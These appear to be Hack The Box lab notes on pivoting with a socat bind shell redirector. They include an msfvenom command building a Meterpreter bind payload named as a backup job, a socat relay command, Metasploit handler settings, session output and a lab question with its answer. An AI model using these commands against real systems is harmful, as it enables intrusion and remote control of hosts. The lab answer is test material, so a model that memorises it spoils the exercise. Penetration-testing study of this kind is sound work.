## What is a Socat Bind Shell Redirector

Same socat relay concept as the reverse shell redirector, but flipped direction. Instead of the Windows target connecting back out, the **Windows target listens** (bind shell) and the pivot host's socat forwards incoming connections from the attack host into that listener.

---

## The Scenario

```
Attack Host          Pivot Host (Ubuntu)         Windows Target
10.10.15.5            listens :8080         →     172.16.5.19:8443
                       forwards to                 (bind shell listening)
                       172.16.5.19:8443
```

- Windows target runs a **bind shell payload** — it opens port 8443 and waits.
- Ubuntu (pivot) can reach Windows on 172.16.5.19:8443, but the attack host cannot reach Windows directly.
- Socat on Ubuntu listens on 8080 and forwards to Windows:8443.
- Metasploit's **bind handler** on the attack host connects out to Ubuntu:8080, which socat relays to the Windows bind shell.

---

## Full Attack Chain

### Step 1 — Generate the Windows bind shell payload

bash

```bash
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443
```

- Payload binds to port `8443` on the Windows target and waits for a connection.

### Step 2 — Start socat bind shell listener (Ubuntu pivot host)

bash

```bash
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

- Listens on Ubuntu port `8080`
- Forwards to Windows target `172.16.5.19:8443`
- `fork` = handle multiple connections

### Step 3 — Configure and start the Metasploit bind handler (attack host)

```
use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp
set RHOST 10.129.202.64
set LPORT 8080
run
```

- `RHOST` = Ubuntu pivot host (where socat is listening)
- `LPORT` = socat's listening port (8080), **not** the Windows bind port

### Step 4 — Execute payload on Windows target

Windows target runs `backupjob.exe` → opens listener on 8443.

### Step 5 — Shell arrives at MSF

```
[*] Sending stage (200262 bytes) to 10.129.202.64
[*] Meterpreter session 1 opened (10.10.14.18:46253 -> 10.129.202.64:8080) at 2022-03-07 12:44:44 -0500
meterpreter > getuid
Server username: INLANEFREIGHT\victor
```

---

## Reverse Shell Redirector vs Bind Shell Redirector

||Reverse Shell Redirector|Bind Shell Redirector|
|---|---|---|
|Who connects first|Windows target → Ubuntu → Attack host|Attack host → Ubuntu → Windows target|
|Windows payload|`reverse_https` / `reverse_tcp`|`bind_tcp`|
|MSF handler role|Waits for incoming connection (`LHOST`)|Initiates connection out (`RHOST`)|
|Socat direction|Relays inbound Windows traffic to attack host|Relays inbound MSF traffic to Windows listener|
|Use case|Windows can reach Ubuntu, attack host can't be reached by Windows|Same network limitation, but payload architecture requires a listener on target|

---

## Socat Syntax Breakdown

bash

```bash
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
#     └─ listen here (from MSF)   └─ forward to here (Windows bind shell)
```

|Part|Meaning|
|---|---|
|`TCP4-LISTEN:8080`|Listen on port 8080 for the MSF bind handler|
|`fork`|Spawn a new process per connection|
|`TCP4:172.16.5.19:8443`|Forward to Windows target's bind shell port|

---

## Key Point

The MSF handler never talks to Windows directly — it thinks it's connecting to Ubuntu:8080. Socat is the transparent middleman piping bytes between the handler and the Windows bind shell. The `RHOST` in the bind handler config is always the **pivot host**, not the real target.

---

## Answer

**Question 1:** What Meterpreter payload did we use to catch the bind shell session? (full path)

**Answer:** `windows/x64/meterpreter/bind_tcp`

---

## Tags

`#htb` `#cpts` `#pivoting` `#socat` `#redirection` `#bindShell` `#msfvenom` `#noSSH`